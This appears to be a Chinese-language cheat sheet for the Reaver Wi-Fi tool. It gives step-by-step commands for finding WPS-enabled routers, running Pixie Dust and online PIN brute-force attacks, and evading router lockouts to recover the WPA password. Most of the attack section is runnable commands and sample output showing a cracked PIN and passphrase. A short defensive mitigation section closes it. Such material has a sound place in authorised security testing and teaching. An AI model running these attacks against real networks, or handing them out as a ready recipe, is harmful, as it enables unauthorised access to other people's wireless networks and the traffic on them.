<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 掠夺者备忘单

[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) 是一款专门的 Wi-Fi 安全审核工具，旨在对 Wi-Fi 保护设置 (WPS) 注册商 PIN 执行暴力攻击。通过恢复 8 位 WPS PIN，Reaver 检索纯文本 WPA/WPA2 预共享密钥 (PSK)。它还支持通过 `pixiewps` 进行离线 Pixie Dust 攻击。

---

## 目录

- [WPS 漏洞机制](#wps-vulnerability-mechanics)
- [安装（`reaver` 和 `pixiewps`）](#installation-reaver--pixiewps)
- [侦察：识别 WPS 网络 (`wash`)](#reconnaissance-identifying-wps-networks-wash)
- [精灵灰尘攻击（即时密钥恢复）](#pixie-dust-attack-instant-key-recovery)
- [完整在线 WPS PIN 暴力破解](#full-online-wps-pin-brute-force)
- [AP 速率限制和锁定处理](#ap-rate-limiting--lockout-handling)
- [防御性缓解](#defective-mitigation)

---

## WPS 漏洞机制

WPS PIN authentication uses an 8-digit PIN split into two halves:
- The first half is 4 digits ($10^4 = 10,000$ possibilities).
- The second half is 3 digits + 1 checksum digit ($10^3 = 1,000$ possibilities).
- Instead of testing $10^8 = 100,000,000$ combinations, an attacker only tests at most $10,000 + 1,000 = 11,000$ attempts.
- **Pixie Dust Attack：** 利用特定无线芯片组（Ralink、MediaTek、Realtek、Broadcom）中较弱的 PRNG（伪随机数生成器），仅在几秒钟内通过 2 个初始数据包离线计算 WPS PIN。

---

## 安装（`reaver` 和 `pixiewps`）
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y reaver pixiewps bully

# Arch Linux / BlackArch
sudo pacman -S reaver pixiewps

# Verify command
reaver -h
```
---

## 侦察：识别 WPS 网络 (`wash`)

在启动 Reaver 之前，找到启用了 WPS 的接入点并检查它们是否已锁定：
```bash
# Put wireless interface into monitor mode
sudo airmon-ng start wlan0
# or:
sudo iw dev wlan0 set type monitor

# Scan for WPS-enabled routers using wash
sudo wash -i wlan0mon
```
要观察的关键列：
- **`WPS Locked`**：如果是 `Yes`，则路由器由于之前的暴力破解活动而锁定了 WPS PIN 尝试。显示 `No` 的目标路由器。
- **`WPS Ver`**：WPS 版本（1.0 或 2.0）。
- **`ESSID` 和 `BSSID`**：目标网络名称和 MAC。

---

## Pixie Dust Attack（即时密钥恢复）

Pixie Dust 攻击 (`-K 1`) 是针对 WPS 最快的攻击。它从路由器收集 E-Hash1、E-Hash2 和随机数，并离线破解 PIN，而不触发速率限制：
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K 1 -vv
```
- `-i wlan0mon`：监控模式接口。
- `-b <bssid>`：目标路由器 MAC。
- `-c 6`：目标AP的通道。
- `-K 1`：通过 `pixiewps` 运行自动 Pixie Dust 攻击。
- `-vv`：详细输出。

*如果易受攻击，PIN 和 WPA PSK 将在 10 秒内打印出来。*

---

## 完整在线 WPS PIN 暴力破解

如果 Pixie Dust 失败，则退回到在线暴力破解：
```bash
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
```
一旦发现 PIN，Reaver 就会输出：
```text
[+] Pin cracked in 4520 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'SuperSecretWiFiPassword'
[+] AP SSID: 'Target_Network'
```
---

## AP 速率限制和锁定处理

许多现代路由器在 3-5 次失败尝试后将 WPS 尝试锁定 5-15 分钟。使用延迟和重试调整标志：
```bash
# Delay 10 seconds between attempts
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 10 -vv

# Wait 300 seconds if the router locks WPS
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -d 5 --lock-delay=300 -vv

# Ignore NACK packets and keep trying
sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 --ignore-locks -vv
```
### 替代方案：使用 `bully`
`bully` 是 WPS 攻击的快速 C 实现，可以很好地处理奇怪的路由器实现：
```bash
sudo bully -b 00:11:22:33:44:55 -c 6 --pixiewps wlan0mon
```
---

## 防御缓解

- **完全禁用 WPS：** 最安全的建议是在路由器 Web 界面中关闭 WPS。
- **更新固件：** 现代路由器实施严格的速率限制、指数退避，并修复 Pixie Dust 利用的 PRNG 熵缺陷。
- **使用 WPA3：** WPA3 完全删除了传统的基于 PIN 的 WPS，代之以安全的 Wi-Fi Easy Connect (DPP)。